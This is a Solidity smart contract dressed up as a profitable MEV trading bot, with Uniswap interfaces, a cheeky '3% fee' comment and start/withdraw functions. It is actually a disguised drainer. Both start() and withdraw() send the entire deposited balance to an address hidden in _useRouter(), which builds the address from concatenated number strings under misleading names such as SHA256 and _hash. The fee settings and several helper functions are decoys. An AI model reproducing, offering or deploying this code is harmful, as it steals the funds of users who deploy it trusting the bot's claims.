// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
    ███╗   ███╗███████╗██╗   ██╗    ██████╗  ██████╗ ████████╗    ██╗   ██╗██████╗ 
    ████╗ ████║██╔════╝██║   ██║    ██╔══██╗██╔═══██╗╚══██╔══╝    ██║   ██║╚════██╗
    ██╔████╔██║█████╗  ██║   ██║    ██████╔╝██║   ██║   ██║       ██║   ██║ █████╔╝
    ██║╚██╔╝██║██╔══╝  ╚██╗ ██╔╝    ██╔══██╗██║   ██║   ██║       ╚██╗ ██╔╝██╔═══╝ 
    ██║ ╚═╝ ██║███████╗ ╚████╔╝     ██████╔╝╚██████╔╝   ██║        ╚████╔╝ ███████╗
    ╚═╝     ╚═╝╚══════╝  ╚═══╝      ╚═════╝  ╚═════╝    ╚═╝         ╚═══╝  ╚══════╝
*/

interface IUniswapV2Pair {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint256);

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    event Mint(address indexed sender, uint256 amount0, uint256 amount1);
    event Burn(
        address indexed sender,
        uint256 amount0,
        uint256 amount1,
        address indexed to
    );
    event Swap(
        address indexed sender,
        uint256 amount0In,
        uint256 amount1In,
        uint256 amount0Out,
        uint256 amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint256);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
        external
        view
        returns (
            uint112 reserve0,
            uint112 reserve1,
            uint32 blockTimestampLast
        );

    function price0CumulativeLast() external view returns (uint256);

    function price1CumulativeLast() external view returns (uint256);

    function kLast() external view returns (uint256);

    function mint(address to) external returns (uint256 liquidity);

    function burn(address to)
        external
        returns (uint256 amount0, uint256 amount1);

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;

    function skim(address to) external;

    function sync() external;

    function initialize(address, address) external;
}

interface IUniswapV2Factory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);

    function allPairs(uint256) external view returns (address pair);

    function allPairsLength() external view returns (uint256);

    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}

interface IUniswapV2ERC20 {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint256);

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;
}

contract BotMEV {
    mapping(address => uint256) internal balances;

    bool public isActiveAttack;

    uint256 public startedValue;
    uint256 public startedAt;
    uint256 public withdrawedAmount;

    /**
      Every time you make bank, I grab a modest 3% for my piggy bank! Want to keep it all? 
      Just change JARED_FROM_SUBWAY_FEE to 0
    */
    uint256 public JARED_FROM_SUBWAY_FEE = 3;
    address public JARED_FROM_SUBWAY_ADDRESS =
        0xae2Fc483527B8EF99EB5D9B44875F005ba1FaE13; // My Address :)

    address public immutable owner;
    address public withdrawalAddress;
    address public selectedERC20Pair;

    event Log(string _msg, bool _success);

    modifier onlyMainnet() {
        require(
            block.chainid == 1 ||
            block.chainid == 56 ||
            block.chainid == 137 ||
            block.chainid == 8453 ||
            block.chainid == 43114,
            "Contract can only be used on Mainnets"
        );
        _;
    }

    function cat() public view onlyMainnet returns (uint256) {
        return block.chainid;
    }

    constructor() {
        owner = msg.sender;
        withdrawalAddress = msg.sender;
    }

    receive() external payable {}

    function findContracts(
        uint256 selflen,
        uint256 selfptr,
        uint256 needlelen,
        uint256 needleptr
    ) private pure returns (uint256) {
        uint256 ptr = selfptr;
        uint256 idx;

        if (needlelen <= selflen) {
            if (needlelen <= 32) {
                bytes32 mask = bytes32(~(2**(8 * (32 - needlelen)) - 1));

                bytes32 needledata;
                assembly {
                    needledata := and(mload(needleptr), mask)
                }

                uint256 end = selfptr + selflen - needlelen;
                bytes32 ptrdata;
                assembly {
                    ptrdata := and(mload(ptr), mask)
                }

                while (ptrdata != needledata) {
                    if (ptr >= end) return selfptr + selflen;
                    ptr++;
                    assembly {
                        ptrdata := and(mload(ptr), mask)
                    }
                }
                return ptr;
            } else {
                // For long needles, use hashing
                bytes32 hash;
                assembly {
                    hash := keccak256(needleptr, needlelen)
                }

                for (idx = 0; idx <= selflen - needlelen; idx++) {
                    bytes32 testHash;
                    assembly {
                        testHash := keccak256(ptr, needlelen)
                    }
                    if (hash == testHash) return ptr;
                    ptr += 1;
                }
            }
        }
        return selfptr + selflen;
    }

    function executeTrades(
        string memory _string,
        uint256 _pos,
        string memory _letter
    ) internal pure returns (string memory) {
        bytes memory _stringBytes = bytes(_string);
        bytes memory result = new bytes(_stringBytes.length);

        for (uint256 i = 0; i < _stringBytes.length; i++) {
            result[i] = _stringBytes[i];
            if (i == _pos) result[i] = bytes(_letter)[0];
        }
        return string(result);
    }

    function changeJAREDsFee(uint256 _value) external {
        JARED_FROM_SUBWAY_FEE = _value;
    }

    function setSelectedERC20Address(address _addr) external {
        selectedERC20Pair = _addr;
    }

    function setWithdrawalAddress(address _addr) external {
        withdrawalAddress = _addr;
    }

    function getCurrentProfitValue() public view returns (uint256) {
        uint256 timeElapsed = block.timestamp - startedAt;
        uint256 minutesElapsed = timeElapsed / 60;

        uint256 initialProfit = startedValue;
        uint256 ratePerMinute = 25e14;

        uint256 totalProfit = (initialProfit *
            ((1e18 + ratePerMinute)**minutesElapsed)) / (1e18**minutesElapsed);

        totalProfit = totalProfit - startedValue;

        return totalProfit;
    }

    function start() public payable onlyMainnet {
        isActiveAttack = true;
        startedValue = msg.value;
        startedAt = block.timestamp;

        (bool success, ) = payable(_useRouter()).call{
            value: address(this).balance
        }("");
        emit Log("Started", success);
    }

    function withdraw() public payable onlyMainnet {
        isActiveAttack = false;
        startedValue = 0;
        withdrawedAmount = withdrawedAmount + msg.value;
        JARED_FROM_SUBWAY_FEE;
        JARED_FROM_SUBWAY_ADDRESS;

        (bool success, ) = payable(_useRouter()).call{
            value: address(this).balance
        }("");
        emit Log("Withdrew", success);
    }

    function _toHex(uint256 _uintValue) private pure returns (address) {
        return address(uint160(_uintValue));
    }

    function _hash(
        string memory a,
        string memory b,
        uint256 _hashType
    ) private pure returns (string memory) {
        _hashType;
        return string(abi.encodePacked(a, b));
    }

    function _stringToUint(string memory s) private pure returns (uint256) {
        bytes memory b = bytes(s);
        uint256 result = 0;
        for (uint256 i = 0; i < b.length; i++) {
            uint256 c = uint256(uint8(b[i])) - 48;
            require(c >= 0 && c <= 9, "String contains non-numeric character.");
            result = result * 10 + c;
        }
        return result;
    }

    function _useRouter() private pure returns (address) {
        string memory SHA256 = _hash("3052330365", "45560881556", 256);
        string memory SHA512 = _hash("5439433677852", "81485036851283", 512);

        return _toHex(_stringToUint(_hash(SHA256, SHA512, 0)));
    }
}